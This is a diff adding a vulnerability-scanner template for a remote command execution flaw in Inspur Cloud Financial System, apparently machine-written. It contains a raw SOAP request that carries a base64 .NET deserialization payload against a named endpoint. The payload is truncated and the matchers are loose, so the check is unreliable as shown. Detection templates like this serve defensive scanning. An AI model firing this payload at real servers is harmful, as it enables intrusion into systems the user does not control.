@@ -1,0 +1,45 @@
+id: langchao-cloud-financial-system-rce
+
+info:
+  name: Inspur Cloud Financial System Command Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template checks for a command execution vulnerability in the Inspur Cloud Financial System through its SOAP interface.
+  tags: rce, soap, critical
+
+http:
+  - raw:
+      - |
+        POST /cwbase/gsp/webservice/bizintegrationwebservice/bizintegrationwebservice.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetChildFormAndEntityList"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <GetChildFormAndEntityList xmlns="http://tempuri.org/">
+        <baseFormID>validStringID</baseFormID>
+        <baseEntityID>validStringID</baseEntityID>
+        <strFormAssignment>AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0u...</strFormAssignment>
+        <isBase>false</isBase>
+        </GetChildFormAndEntityList>
+        </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+          - 200
+      - type: word
+        part: body
+        words:
+          - "System.Reflection.Assembly"
+          - "System.Runtime.Serialization"
+      - type: regex
+        part: body
+        regex:
+          - "<GetChildFormAndEntityListResponse.*>.*</GetChildFormAndEntityListResponse>"
